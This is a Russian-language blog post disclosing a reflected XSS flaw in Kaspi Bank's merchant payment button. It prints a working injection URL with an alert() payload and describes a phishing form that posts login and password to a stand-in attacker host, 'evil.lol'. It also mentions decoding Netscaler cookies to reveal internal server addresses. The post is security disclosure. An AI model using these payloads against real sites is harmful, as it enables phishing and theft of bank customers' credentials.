---
layout: post
title: "Уязвимость в Kaspi Bank 2 (XSS)"
date: '2016-3-29T21:56:24+06:00'
categories: bank security
about: 'about.html'
---
Сегодня расскажем об очередном XSS на сайте банка. Предыдущий пост про Kaspi можно прочитать [здесь].
<!--more-->

>**XSS** (cross site scripting) или межсайтовый скриптинг - это серьезная уязвимость. Простыми словами, на вашем сайте (без вашего 
разрешения) выполняется чужой код. То есть, кто-то может контролировать что делает или видит пользователь вашего сайта! 

Часто на сайтах интернет-магазинов можно увидеть вот такую кнопку от Kaspi банка. Здесь также показан ответ от сервера банка.
![image][img0]
  
Сама кнопка отображается с помощью &lt;iframe&gt;; ссылка выглядит так:
  
>hxxps://kaspi.kz/kaspibutton/frame?template=button&merchantSku=
00000014673&merchantCode=XXXXX&city=000000&id=ks-xxxxx

Параметры **template**, **id** и т.д. отображаются на странице без соответствующей обработки. Это значит, что мы можем вставить любой HTML/JS код.
Пример c alert():

>hxxps://kaspi.kz/kaspibutton/frame?template=button&id=kaspi%27};alert%28document.domain%29;var%20a={aa:%27c

![image][img1]
Результат для пользователя:
![image][img2]


Что могут сделать мошенники через XSS? Привидем пример фишинг страницы на сайте банка через **document.write()**.
![image][img3]

Код создает такую форму:

&lt;form action=**//evil.lol**&gt;&lt;input name=“login”&gt;&lt;input name=“password”&gt;&lt;/form&gt;

![image][img4]

Когда пользователь заполнит и отправит форму, мошенникам остается только посмотреть логи сервера на **evil.lol**. 
Там будет вся необходимая информация. Результат после нажатия кнопки *Login to Kaspi*:
![image][img5]

Как мы видим, нельзя недооценивать последствия вставки кода. Надеюсь, что данное утверждение будет верным.
![image][img6]

**P.S.**<br/>
Похоже, что этот сервер использует Citrix Netscaler. Вы получаете шифрованный куки *NSC_xxxx.xxxxx* 
который можно расшифровать с помощью этого [скрипта] чтобы извлечь имя хоста, порт и внутренний IP сервера. Not bad. 

[здесь]: https://caspicasoft.com/blog/2015/12/03/kaspi-bank-xss-beef
[скрипта]: https://github.com/catalyst256/Netscaler-Cookie-Decryptor
[img0]: /assets/images/{{page.slug}}/img0.png
[img1]: /assets/images/{{page.slug}}/img1.png
[img2]: /assets/images/{{page.slug}}/img2.png
[img3]: /assets/images/{{page.slug}}/img3.png
[img4]: /assets/images/{{page.slug}}/img4.png
[img5]: /assets/images/{{page.slug}}/img5.png
[img6]: /assets/images/{{page.slug}}/img6.png